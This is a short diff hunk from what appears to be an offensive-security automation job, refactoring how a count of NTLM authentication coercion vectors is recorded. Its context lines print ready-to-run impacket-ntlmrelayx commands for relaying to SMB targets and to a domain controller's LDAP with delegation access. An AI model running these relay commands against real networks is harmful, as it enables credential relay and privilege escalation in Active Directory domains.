@@ -112,9 +112,7 @@ jobs:
             except Exception:
                 pass
 
-        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
-            f.write(f"coercion_count={len(vectors)}\n")
-
+        add_outputs(coercion_count=len(vectors))
         print(f"\n--- Relay Commands ---")
         print(f"  ntlmrelayx: impacket-ntlmrelayx -tf /tmp/ofx_relay_targets.txt -smb2support")
         print(f"  ntlmrelayx (LDAP): impacket-ntlmrelayx -t ldap://{dc} --delegate-access")
